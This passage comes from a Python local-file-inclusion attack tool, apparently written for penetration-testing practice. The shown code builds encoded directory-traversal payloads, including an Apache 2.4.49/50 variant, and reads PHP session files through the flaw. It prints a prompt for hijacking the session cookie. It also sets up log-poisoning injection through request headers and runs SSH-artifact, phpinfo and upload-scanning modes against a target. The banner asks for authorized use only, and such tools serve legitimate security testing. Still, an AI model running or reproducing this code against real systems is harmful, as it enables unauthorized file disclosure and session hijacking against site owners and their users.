            status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                     url, verbose=config['verbose'])
            if status == 200 and self.is_directory_listing(content):
                files = self.extract_filenames_from_listing(content)
                sess_files = [f for f in files if f.startswith('sess_')]
                self._print(f"[+] Found {len(sess_files)} session files:", 'success')
                for sf in sess_files[:10]:
                    self._print(f"  - {sf}", 'info')
            else:
                self._print("[-] Directory listing failed.", 'error')
        else:
            # Read specific session file
            sess_file = session_path.rstrip('/') + '/sess_' + sid
            lfi_payload = config['traversal_prefix'] + sess_file.lstrip('/')
            encoded = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
            if config['lfi_type'] == 'path':
                url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
            else:
                url = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])

            status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                     url, verbose=config['verbose'])
            if status == 200 and content:
                self._print("[+] Session file retrieved!", 'success')
                self._print("\n[--- SESSION DATA (raw) ---]", 'info')
                print(content[:500] + ('...' if len(content) > 500 else ''))
                self._print("\n[+] To hijack this session, set your cookie:", 'info')
                self._print(f"    PHPSESSID={sid}", 'info')
            else:
                self._print("[-] Session file not found or not readable.", 'error')

    # -------------------------------------------------------------------------
    #   Interactive Setup
    # -------------------------------------------------------------------------
    def show_banner(self):
        banner = f"""
{self.colors['banner']}{'='*70}
 LFI-Scanner – OSCP‑Safe LFI Enumeration Framework
{'='*70}
 Author: RevShellXD
 Modes:
   1) SSH / Browser Artifact Fuzzing
   2) Log Poisoning Detection
   3) phpinfo() Scanner (Race Condition Prep)
   4) Uploaded File Scanner
   5) PHP Session Enumeration
{'='*70}{Style.RESET_ALL if COLORS else ''}

 No automatic exploitation – manual curl commands only.
 Use only on systems you are authorized to test.
"""
        print(banner)

    def interactive_setup(self) -> Dict:
        self._print("\n[*] INITIAL CONFIGURATION", 'highlight')
        print("-" * 40)

        # OS Selection
        while True:
            os_choice = input("Target operating system? (linux/windows) [linux]: ").strip().lower()
            if not os_choice:
                self.config['os_type'] = 'linux'
                break
            if os_choice in ['linux', 'windows']:
                self.config['os_type'] = os_choice
                break
            self._print("Invalid choice. Enter 'linux' or 'windows'.", 'error')

        # Attack Mode Selection
        print("\nSelect attack mode:")
        print("1) SSH / Browser Artifact Fuzzing")
        print("2) Log Poisoning Detection")
        print("3) phpinfo() Scanner")
        print("4) Uploaded File Scanner")
        print("5) PHP Session Enumeration")
        while True:
            mode = input("Choice (1-5): ").strip()
            if mode in ['1', '2', '3', '4', '5']:
                self.config['selected_mode'] = mode
                break
            self._print("Invalid choice. Enter 1-5.", 'error')

        # Log poisoning specific config
        if mode == '2':
            print("\nSelect injection vector for log poisoning:")
            print("1) User-Agent")
            print("2) Referer")
            print("3) X-Forwarded-For")
            print("4) Custom header")
            print("5) Query parameter")
            vec_choice = input("Choice (1-5): ").strip()
            vectors = {'1': 'ua', '2': 'referer', '3': 'xff', '4': 'header', '5': 'param'}
            self.config['log_vector'] = vectors.get(vec_choice, 'ua')
            if self.config['log_vector'] == 'header':
                self.config['log_header'] = input("Header name: ").strip()
            if self.config['log_vector'] == 'param':
                self.config['log_param'] = input("Parameter name (default: 'test'): ").strip() or 'test'

        # Target Details
        self._print("\n[*] TARGET CONFIGURATION", 'highlight')
        print("-" * 40)

        while True:
            proto = input("Enter protocol (http or https): ").strip().lower()
            if proto in ['http', 'https']:
                break
            self._print("Invalid protocol.", 'error')

        while True:
            port_str = input("Enter port (e.g., 80, 443): ").strip()
            if port_str.isdigit() and 1 <= int(port_str) <= 65535:
                port = int(port_str)
                break
            self._print("Invalid port.", 'error')

        target = input("Enter target IP or domain: ").strip()

        while True:
            lfi_type = input("Is the LFI a path segment or query parameter? (path/param): ").strip().lower()
            if lfi_type in ['path', 'param']:
                break
            self._print("Invalid LFI type.", 'error')

        if lfi_type == 'path':
            print("\nEnter the path from domain to vulnerable endpoint (e.g., 'home/cgi-bin'):")
            base_path = input("LFI base path: ").strip().rstrip('/')
            base_url = f"{proto}://{target}:{port}/{base_path}"
            param_name = None
        else:
            base_url = input("Enter full base URL (e.g., http://target/index.php): ").strip().rstrip('/')
            param_name = input("Enter LFI parameter name (e.g., 'file'): ").strip()

        verbose = input("\nEnable verbose output? (y/N): ").strip().lower() == 'y'

        depth_str = input(f"Enter traversal depth (default: {self.config['traversal_depth']}): ").strip()
        if depth_str.isdigit():
            self.config['traversal_depth'] = int(depth_str)
        traversal_prefix = '../' * self.config['traversal_depth']

        # Encoding
        print("\nSelect encoding type:")
        print("1) None (recommended for Windows)")
        print("2) Single encoding")
        print("3) Double encoding")
        print("4) Custom double (Apache 2.4.49/50)")
        print("5) Unicode encoding")
        print("6) Custom user encoding")
        while True:
            enc_choice = input("Choice (1-6): ").strip()
            enc_map = {'1': 'none', '2': 'single', '3': 'double',
                       '4': 'custom_double', '5': 'unicode', '6': 'user_custom'}
            encoding = enc_map.get(enc_choice)
            if encoding:
                break
            self._print("Invalid choice.", 'error')

        user_encoding = None
        if encoding == 'user_custom':
            user_encoding = input("Enter custom encoding string to replace '../': ").strip()

        # Windows encoding override
        if self.config['os_type'] == 'windows' and encoding != 'none':
            self._print("\n[!] Windows target detected – forcing encoding to 'None'.", 'warning')
            self._print("    Your target accepts forward slashes; other encodings may break the URL.\n", 'warning')
            encoding = 'none'
            user_encoding = None

        self.config['encoding'] = encoding
        self.config['user_encoding'] = user_encoding

        # Max recursive depth (only for mode 1)
        if mode == '1':
            maxd = input(f"\nMax recursive depth (default: {self.config['max_depth']}): ").strip()
            if maxd.isdigit():
                self.config['max_depth'] = int(maxd)

        # Return configuration dictionary (including os_type for mode functions)
        return {
            'protocol': proto,
            'host': target,
            'port': port,
            'base_url': base_url,
            'lfi_type': lfi_type,
            'param_name': param_name,
            'verbose': verbose,
            'traversal_prefix': traversal_prefix,
            'encoding': encoding,
            'user_encoding': user_encoding,
            'max_depth': self.config['max_depth'],
            'os_type': self.config['os_type'],          # <-- FIX: include os_type in returned config
        }

    # -------------------------------------------------------------------------
    #   Main Runner
    # -------------------------------------------------------------------------
    def run(self):
        config = self.interactive_setup()
        mode = self.config['selected_mode']

        if mode == '1':
            self.mode1_ssh_fuzzing(config)
        elif mode == '2':
            self.mode2_log_poisoning_detection(config)
        elif mode == '3':
            self.mode3_phpinfo_scanner(config)
        elif mode == '4':
            self.mode4_upload_scanner(config)
        elif mode == '5':
            self.mode5_session_enum(config)
        else:
            self._print("[-] Invalid mode.", 'error')


def main():
    scanner = LFI_Scanner()
    scanner.show_banner()
    try:
        scanner.run()
    except KeyboardInterrupt:
        print("\n\n[*] Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        if '--verbose' in sys.argv:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
